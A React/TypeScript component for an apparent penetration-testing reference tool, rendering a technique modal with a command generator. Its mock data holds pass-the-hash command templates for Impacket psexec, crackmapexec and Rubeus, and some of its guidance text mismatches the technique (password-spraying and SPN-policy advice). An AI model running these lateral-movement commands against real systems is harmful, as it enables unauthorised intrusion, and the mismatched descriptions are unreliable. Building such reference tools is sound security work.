import { useState } from "react";
import { X, Copy, Star, Zap, Shield, AlertTriangle, Eye, Settings } from "lucide-react";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Textarea } from "@/components/ui/textarea";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { toast } from "@/hooks/use-toast";

interface Technique {
  id: string;
  title: string;
  description: string;
  phase: string;
  tags: string[];
  tools: string[];
  starred: boolean;
  category: string;
}

interface TechniqueModalProps {
  technique: Technique;
  isOpen: boolean;
  onClose: () => void;
}

// Mock detailed data for the technique
const getDetailedTechnique = (technique: Technique) => ({
  ...technique,
  whenToUse: [
    "When you have a list of valid usernames but no passwords",
    "Use during initial reconnaissance phase",
    "When organization has weak password policies"
  ],
  prerequisites: [
    "List of valid usernames, common password list"
  ],
  howToUse: [
    "Extract NTLM hashes from memory or registry",
    "Use hash with authentication tools", 
    "Access remote systems"
  ],
  commands: [
    {
      tool: "Impacket",
      template: "psexec.py target.local/user@{target_ip} -hashes :{ntlm_hash}",
      params: [
        { name: "target_ip", required: true, example: "10.10.10.10" },
        { name: "ntlm_hash", required: true, example: "aad3b435b51404eeaad3b435b51404ee:hash" }
      ]
    },
    {
      tool: "crackmapexec",
      template: "crackmapexec smb {target_range} -u {username} -H {ntlm_hash}",
      params: [
        { name: "target_range", required: true, example: "10.10.10.0/24" },
        { name: "username", required: true, example: "user" },
        { name: "ntlm_hash", required: true, example: "ntlmhash" }
      ]
    },
    {
      tool: "Rubeus",
      template: "Rubeus.exe asktgt /user:{username} /rc4:{ntlm_hash} /domain:{domain}",
      params: [
        { name: "username", required: true, example: "user" },
        { name: "ntlm_hash", required: true, example: "hash" },
        { name: "domain", required: false, example: "target.local" }
      ]
    }
  ],
  detection: [
    "Unusual authentication patterns, NTLM authentication from unexpected sources"
  ],
  mitigation: [
    "Strong SPN password policy"
  ],
  mitreMapping: "T1550.002"
});

export const TechniqueModal = ({ technique, isOpen, onClose }: TechniqueModalProps) => {
  const [selectedCommand, setSelectedCommand] = useState(0);
  const [generatedCommand, setGeneratedCommand] = useState("");
  const [commandParams, setCommandParams] = useState<Record<string, string>>({});
  
  const detailedTechnique = getDetailedTechnique(technique);

  const generateCommand = () => {
    const command = detailedTechnique.commands[selectedCommand];
    let generated = command.template;
    
    command.params.forEach(param => {
      const value = commandParams[param.name] || param.example;
      generated = generated.replace(`{${param.name}}`, value);
    });
    
    setGeneratedCommand(generated);
  };

  const copyCommand = () => {
    navigator.clipboard.writeText(generatedCommand);
    toast({
      title: "Copied",
      description: "Command copied to clipboard."
    });
  };

  const getPhaseColor = (phase: string) => {
    switch (phase) {
      case "Initial Access": return "bg-cyber-blue/20 text-cyber-blue border-cyber-blue/30";
      case "Reconnaissance": return "bg-cyber-green/20 text-cyber-green border-cyber-green/30";
      case "Credential Access": return "bg-cyber-purple/20 text-cyber-purple border-cyber-purple/30";
      case "Lateral Movement": return "bg-cyber-orange/20 text-cyber-orange border-cyber-orange/30";
      default: return "bg-muted/20 text-muted-foreground border-muted/30";
    }
  };

  return (
    <Dialog open={isOpen} onOpenChange={onClose}>
      <DialogContent className="max-w-4xl max-h-[90vh] overflow-y-auto bg-gradient-card border-border">
        <DialogHeader className="pb-4 border-b border-border/30">
          <div className="flex items-start justify-between">
            <div>
              <DialogTitle className="text-2xl text-foreground mb-2">{technique.title}</DialogTitle>
              <div className="flex items-center gap-3">
                <Badge variant="outline" className={getPhaseColor(technique.phase)}>
                  {technique.id}
                </Badge>
                <Badge variant="outline" className="text-muted-foreground">
                  {technique.phase}
                </Badge>
                <div className="flex items-center gap-1 text-muted-foreground">
                  <Zap className="w-4 h-4 text-cyber-orange" />
                  <span className="text-sm">{technique.tools.length} tools available</span>
                </div>
              </div>
            </div>
            <Button
              variant="ghost"
              size="sm"
              className="hover:bg-primary/10"
            >
              <Star className="w-4 h-4 fill-cyber-orange text-cyber-orange" />
            </Button>
          </div>
        </DialogHeader>

        <Tabs defaultValue="overview" className="mt-4">
          <TabsList className="grid w-full grid-cols-4 bg-muted/20">
            <TabsTrigger value="overview">Overview</TabsTrigger>
            <TabsTrigger value="commands">Commands</TabsTrigger>
            <TabsTrigger value="detection">Detection</TabsTrigger>
            <TabsTrigger value="mitigation">Mitigation</TabsTrigger>
          </TabsList>

          <TabsContent value="overview" className="space-y-4">
            <Card className="bg-muted/20 border-border/30">
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <Eye className="w-5 h-5 text-primary" />
                  Description
                </CardTitle>
              </CardHeader>
              <CardContent>
                <p className="text-muted-foreground">{technique.description}</p>
              </CardContent>
            </Card>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <Card className="bg-muted/20 border-border/30">
                <CardHeader>
                  <CardTitle className="text-lg">When to Use</CardTitle>
                </CardHeader>
                <CardContent>
                  <ul className="space-y-2">
                    {detailedTechnique.whenToUse.map((item, index) => (
                      <li key={index} className="text-sm text-muted-foreground flex items-start gap-2">
                        <span className="w-1.5 h-1.5 bg-primary rounded-full mt-2 flex-shrink-0" />
                        {item}
                      </li>
                    ))}
                  </ul>
                </CardContent>
              </Card>

              <Card className="bg-muted/20 border-border/30">
                <CardHeader>
                  <CardTitle className="text-lg">Prerequisites</CardTitle>
                </CardHeader>
                <CardContent>
                  <ul className="space-y-2">
                    {detailedTechnique.prerequisites.map((item, index) => (
                      <li key={index} className="text-sm text-muted-foreground flex items-start gap-2">
                        <span className="w-1.5 h-1.5 bg-cyber-orange rounded-full mt-2 flex-shrink-0" />
                        {item}
                      </li>
                    ))}
                  </ul>
                </CardContent>
              </Card>
            </div>

            <Card className="bg-muted/20 border-border/30">
              <CardHeader>
                <CardTitle className="text-lg">MITRE ATT&CK Mapping</CardTitle>
              </CardHeader>
              <CardContent>
                <Badge variant="outline" className="bg-cyber-red/20 text-cyber-red border-cyber-red/30">
                  {detailedTechnique.mitreMapping}
                </Badge>
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="commands" className="space-y-4">
            <div className="grid grid-cols-1 lg:grid-cols-3 gap-4">
              {/* Tool Selection */}
              <Card className="bg-muted/20 border-border/30">
                <CardHeader>
                  <CardTitle className="text-lg">Tools & Commands</CardTitle>
                </CardHeader>
                <CardContent className="space-y-2">
                  {detailedTechnique.commands.map((cmd, index) => (
                    <Button
                      key={index}
                      variant={selectedCommand === index ? "default" : "outline"}
                      className={`w-full justify-start ${
                        selectedCommand === index ? "bg-gradient-cyber" : ""
                      }`}
                      onClick={() => setSelectedCommand(index)}
                    >
                      {cmd.tool}
                    </Button>
                  ))}
                </CardContent>
              </Card>

              {/* Command Generator */}
              <Card className="lg:col-span-2 bg-muted/20 border-border/30">
                <CardHeader>
                  <CardTitle className="flex items-center gap-2">
                    <Settings className="w-5 h-5 text-primary" />
                    Command Generator
                  </CardTitle>
                  <CardDescription>
                    Fill in the parameters below to generate custom commands
                  </CardDescription>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div className="space-y-3">
                    {detailedTechnique.commands[selectedCommand].params.map((param, index) => (
                      <div key={index} className="space-y-2">
                        <Label htmlFor={param.name} className="text-sm font-medium">
                          {param.name} {param.required && <span className="text-destructive">*</span>}
                        </Label>
                        <Input
                          id={param.name}
                          placeholder={param.example}
                          value={commandParams[param.name] || ""}
                          onChange={(e) => setCommandParams(prev => ({
                            ...prev,
                            [param.name]: e.target.value
                          }))}
                          className="bg-muted/30 border-border/50"
                        />
                      </div>
                    ))}
                  </div>

                  <Button onClick={generateCommand} className="w-full bg-gradient-cyber">
                    Generate Command
                  </Button>

                  {generatedCommand && (
                    <div className="space-y-2">
                      <div className="flex items-center justify-between">
                        <Label className="text-sm font-medium">Generated Command:</Label>
                        <Button
                          variant="outline"
                          size="sm"
                          onClick={copyCommand}
                          className="hover:bg-primary/10"
                        >
                          <Copy className="w-4 h-4 mr-2" />
                          Copy
                        </Button>
                      </div>
                      <Textarea
                        value={generatedCommand}
                        readOnly
                        className="font-mono text-sm bg-muted/30 border-border/50"
                        rows={3}
                      />
                    </div>
                  )}
                </CardContent>
              </Card>
            </div>
          </TabsContent>

          <TabsContent value="detection" className="space-y-4">
            <Card className="bg-muted/20 border-border/30">
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <Shield className="w-5 h-5 text-cyber-green" />
                  Detection Methods
                </CardTitle>
              </CardHeader>
              <CardContent>
                <ul className="space-y-3">
                  {detailedTechnique.detection.map((item, index) => (
                    <li key={index} className="text-sm text-muted-foreground flex items-start gap-3">
                      <AlertTriangle className="w-4 h-4 text-cyber-orange mt-0.5 flex-shrink-0" />
                      {item}
                    </li>
                  ))}
                </ul>
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="mitigation" className="space-y-4">
            <Card className="bg-muted/20 border-border/30">
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <Shield className="w-5 h-5 text-cyber-green" />
                  Mitigation Strategies
                </CardTitle>
              </CardHeader>
              <CardContent>
                <ul className="space-y-3">
                  {detailedTechnique.mitigation.map((item, index) => (
                    <li key={index} className="text-sm text-muted-foreground flex items-start gap-3">
                      <Shield className="w-4 h-4 text-cyber-green mt-0.5 flex-shrink-0" />
                      {item}
                    </li>
                  ))}
                </ul>
              </CardContent>
            </Card>
          </TabsContent>
        </Tabs>
      </DialogContent>
    </Dialog>
  );
};